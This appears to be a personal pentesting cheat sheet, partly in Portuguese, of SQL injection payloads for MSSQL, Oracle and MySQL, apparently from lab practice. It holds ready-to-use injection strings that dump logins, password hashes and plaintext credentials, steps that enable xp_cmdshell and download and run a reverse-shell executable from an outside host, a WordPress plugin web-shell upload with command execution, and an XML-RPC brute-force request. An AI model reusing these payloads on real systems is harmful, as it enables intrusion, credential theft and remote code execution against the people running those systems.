    ' + CONVERT( INT,(SELECT top 1 psw FROM archive.dbo.pmanager WHERE alogin=cast(0x77656261646d696e as varchar) )) + ' #webadmin::5b413fe170836079622f4131fe6efa2d
    ' + CONVERT( INT,(SELECT top 1 psw FROM archive.dbo.pmanager WHERE alogin=cast(0x61646d696e6973747261746f72 as varchar) )) + ' #administrator::3c744b99b8623362b466efb7203fd182
    ' + CONVERT( INT,(SELECT top 1 psw FROM archive.dbo.pmanager WHERE alogin=cast(0x65726963 as varchar) )) + ' #eric::cb2d5be3c78be06d47b697468ad3b33b   sup3rs3cr3t



USE DATABASE_A

SELECT *
FROM   DATABASE_B.INFORMATION_SCHEMA.columns
WHERE  TABLE_NAME = 'TABLE_NAME' 




 ' + cast((SELECT password FROM master..syslogins  WHERE name=cast( 0x776562617070 as varchar)) as int) + '



MSSQL 2000:
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins

webapp=0x776562617070
sa=0x7361

' + cast((SELECT master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins  WHERE name=cast( 0x7361 as varchar)) as int) + '

## XP_CMDSHELL
## 1 - Encontrar o numero de colunas 
    Metallica ' ORDER BY 1 --               # Sem erro
    Metallica ' ORDER BY 2 --               # Erro 

    Metallica ' UNION SELECT NULL --        # ERRO
    Metallica ' UNION SELECT NULL,NULL --   $ Sem Erro 

    ## 2 - Achar a coluna que retorna valor 
    Metallica ' UNION SELECT 'a',NULL --    # Retornou a na ultima linha 
    Metallica ' UNION SELECT @@version,NULL --

    Metallica ' UNION SELECT user_name(),NULL --  # dbo
    Metallica ' UNION SELECT cast((SELECT @@servername) as varchar),NULL -- 
    Metallica ' UNION SELECT name + '~' + password,NULL FROM master..syslogins -- 
    Metallica ' UNION SELECT DB_NAME(0),NULL  ; --

    ### Lista todas as Databases
    Metallica ' UNION SELECT name,NULL FROM master..sysdatabases ; --
    ## Usuarios
        Metallica ' UNION SELECT name,NULL from master.sys.server_principals; --


    # Tabelas
    Metallica ' UNION SELECT name,NULL FROM master..sysobjects WHERE xtype = 'U'; --


    Metallica' EXEC sp_configure  'show advanced options', '1' --
    Metallica' RECONFIGURE -- 
    Metallica' EXEC sp_configure 'xp_cmdshell', '1' --
    Metallica' RECONFIGURE --
    Metallica' EXEC xp_cmdshell 'dir . ' --
    Metallica' EXEC xp_cmdshell 'powershell -Sta -Nop -Window Hidden -Command "curl http://192.168.119.205/rev205.exe -OutFile rev.exe"' --
    Metallica' EXEC xp_cmdshell '.\rev.exe' --

    Metallica ' UNION SELECT name ,NULL FROM sysusers WHERE name = USER_NAME() --
    Metallica ' UNION SELECT cast((SELECT name FROM master..syslogins WHERE id = 1) as varchar),NULL --         



## ORACLE 
    admin ' ORDER BY 1 -- 
    ' ORDER BY 4 -- 
    admin ' UNION SELECT NULL from DUAL --
    ' UNION SELECT NULL,NULL,NULL FROM DUAL --
    ' UNION SELECT 'a','b','c' FROM DUAL --
    ' UNION SELECT 'a','b',NULL FROM DUAL --


    admin ' UNION SELECT TABLE_NAME from all_tables --
    admin ' UNION SELECT count(TABLE_NAME) from all_tables --


    admin ' UNION SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual --
    admin ' UNION SELECT count(utl_inaddr.get_host_name((select banner from v$version where rownum=1))) FROM dual --
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))) FROM dual --


    #Usuário atual
    SELECT user FROM dual
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT user FROM dual))) FROM dual --  #WEB_APP

    #Listar usuarios
    SELECT username FROM all_users ORDER BY username
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1))) FROM dual --  #SYS
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS') ))) FROM dual -- #AUDSYS
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS','AUDSYS') ))) FROM dual --  #SYSTEM
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS','AUDSYS','SYSTEM') ))) FROM dual --  #OUTLN
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS','AUDSYS','SYSTEM','OUTLN') ))) FROM dual -- #GSMADMIN_INTERNAL
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS','AUDSYS','SYSTEM','OUTLN','GSMADMIN_INTERNAL') ))) FROM dual -- #GSMUSER
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS','AUDSYS','SYSTEM','OUTLN','GSMADMIN_INTERNAL','GSMUSER') ))) FROM dual -- #DIP
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS','AUDSYS','SYSTEM','OUTLN','GSMADMIN_INTERNAL','GSMUSER','DIP') ))) FROM dual -- #REMOTE_SCHEDULER_AGENT
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT username FROM all_users where rownum = 1 and username not in ('SYS','AUDSYS','SYSTEM','OUTLN','GSMADMIN_INTERNAL','GSMUSER','DIP','REMOTE_SCHEDULER_AGENT') ))) FROM dual -- #DBSFWUSER



    #Hashes
    #Nao deu 
        SELECT name, password FROM sys.user$ 
        admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT name, password FROM sys.user$))) FROM dual --

    #Databases
    SELECT DISTINCT owner FROM all_tables
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT owner FROM all_tables where rownum = 1 ))) FROM dual --

    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM all_tables where rownum = 1 ))) FROM dual -- #DUAL
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM all_tables where rownum = 1 and table_name not in ('DUAL', 'SYSTEM_PRIVILEGE_MAP','TABLE_PRIVILEGE_MAP','USER_PRIVILEGE_MAP','STMT_AUDIT_OPTION_MAP','FINALHIST$','MODELGTTRAW$', 'AV_DUAL')))) FROM dual --


    #Database atual - XE 
    SELECT SYS.DATABASE_NAME FROM DUAL
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT SYS.DATABASE_NAME FROM DUAL))) FROM dual --

    #Tabelas do usuário atual - Se mostrou a melhor estratégia no LAB 
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,(SELECT table_name from all_tables where owner = 'WEB_APP' and rownum = 1 and table_name not in ('WEB_ADMINS','WEB_CONTENT','WEBUSERS','WEB_USERS') ))) FROM dual -- #WEBADMINS

    #Listar as colunas de uma tabela
    SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
    ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = 'WEB_ADMINS' --
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,( SELECT column_name FROM all_tab_columns WHERE table_name = 'WEBADMINS' and rownum = 1  ))) FROM dual --
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,( SELECT column_name FROM all_tab_columns WHERE table_name = 'WEB_USERS' and rownum = 1 and column_name not in ('PASSWORD') ))) FROM dual --
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,( SELECT column_name FROM all_tab_columns WHERE table_name = 'WEB_USERS' and rownum = 1 and column_name not in ('PASSWORD','USER_ID','USER_NAME' ) ))) FROM dual -- 

    #Extrair dados
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,( SELECT USER_NAME||PASSWORD FROM WEB_USERS WHERE rownum = 1  ))) FROM dual --
    admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,( SELECT USER_NAME FROM WEB_USERS where rownum = 1 and USER_NAME not in ('eric','alice','maria') ))) FROM dual --

    ' UNION SELECT ADMIN_NAME,PASSWORD,NULL FROM WEB_ADMINS --
        # Concatenando
        admin ' UNION SELECT count(CTXSYS.DRITHSX.SN(user,( SELECT USER_NAME||'::'||PASSWORD FROM WEB_USERS where rownum = 1 and USER_NAME not in ('eric','alice') ))) FROM dual --
                    maria::letmein
                    alice::bobismyuncle
                    eric::thisismypassword
                    admin d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892

## MySql 
    # comandos uteis
    select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir; 
    SHOW Grants; 


    #Verificar tabelas
    ' Union select table_name, NULL FROM information_schema.tables --        #' comentário 
    # Verificar colunas de uma tabela especifica
    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='wp_users' -- 
    # Extrair informações
    ' UNION SELECT user_login, NULL FROM wp_users --

# WordPRess - Plugin Upload 
    ┌──(cassio㉿KaerMorhen)-[/usr/share/seclists/Web-Shells/WordPress]
    └─$ ls                                                                                                  
    bypass-login.php  plugin-shell.php

    ┌──(cassio㉿KaerMorhen)-[/usr/share/seclists/Web-Shells/WordPress]
    └─$ sudo zip plugin-shell.zip plugin-shell.php
    adding: plugin-shell.php (deflated 58%)

    ┌──(cassio㉿KaerMorhen)-[/usr/share/seclists/Web-Shells/WordPress]
    └─$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami

    #XMLRPC -Bruteforce 
    curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>princess</value></param></params></methodCall>" http://10.11.1.234/xmlrpc.php


# ThunderBird 
    type c:\Users\Usuario\AppData\Roaming\ThunderBird\PRofiles\h21j31us.defaul-releas\Mail\mail.sandbox.local\Inbox

